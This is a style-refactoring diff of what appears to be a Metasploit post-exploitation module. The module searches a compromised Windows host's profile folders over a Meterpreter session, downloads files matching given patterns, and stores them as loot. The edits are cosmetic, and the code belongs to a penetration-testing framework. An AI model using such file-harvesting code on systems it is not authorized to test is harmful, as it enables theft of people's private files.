@@ -47,8 +47,8 @@ class MetasploitModule < Msf::Post
   def download_files(location, file_type)
     sysdriv = client.sys.config.getenv('SYSTEMDRIVE')
     sysnfo = client.sys.config.sysinfo['OS']
-    profile_path_old = sysdriv + "\\Documents and Settings\\"
-    profile_path_new = sysdriv + "\\Users\\"
+    profile_path_old = sysdriv + '\\Documents and Settings\\'
+    profile_path_new = sysdriv + '\\Users\\'
 
     if location
       print_status("Searching #{location}")
@@ -67,7 +67,7 @@ class MetasploitModule < Msf::Post
       filename = "#{file['path']}\\#{file['name']}"
       data = read_file(filename)
       print_status("Downloading #{file['path']}\\#{file['name']}")
-      p = store_loot("host.files", 'application/octet-stream', session, data, file['name'], filename)
+      p = store_loot('host.files', 'application/octet-stream', session, data, file['name'], filename)
       print_good("#{file['name']} saved as: #{p}")
     end
   end
@@ -75,35 +75,33 @@ class MetasploitModule < Msf::Post
   def run
     # When the location is set, make sure we have a valid path format
     location = datastore['SEARCH_FROM']
-    if location and location !~ /^([a-z])\:[\\|\/].*/i
+    if location && location !~ (%r{^([a-z]):[\\|/].*}i)
       print_error("Invalid SEARCH_FROM option: #{location}")
       return
     end
 
     # When the location option is set, make sure we have a valid drive letter
-    my_drive = $1
+    my_drive = ::Regexp.last_match(1)
     drives = get_drives
-    if location and not drives.include?(my_drive)
+    if location && !drives.include?(my_drive)
       print_error("#{my_drive} drive is not available, please try: #{drives.inspect}")
       return
     end
 
-    datastore['FILE_GLOBS'].split(",").each do |glob|
-      begin
-        download_files(location, glob.strip)
-      rescue ::Rex::Post::Meterpreter::RequestError => e
-        if e.message =~ /The device is not ready/
-          print_error("#{my_drive} drive is not ready")
-          next
-        elsif e.message =~ /The system cannot find the path specified/
-          print_error("Path does not exist")
-          next
-        else
-          raise e
-        end
+    datastore['FILE_GLOBS'].split(',').each do |glob|
+      download_files(location, glob.strip)
+    rescue ::Rex::Post::Meterpreter::RequestError => e
+      if e.message =~ /The device is not ready/
+        print_error("#{my_drive} drive is not ready")
+        next
+      elsif e.message =~ /The system cannot find the path specified/
+        print_error('Path does not exist')
+        next
+      else
+        raise e
       end
     end
 
-    print_status("Done!")
+    print_status('Done!')
   end
 end
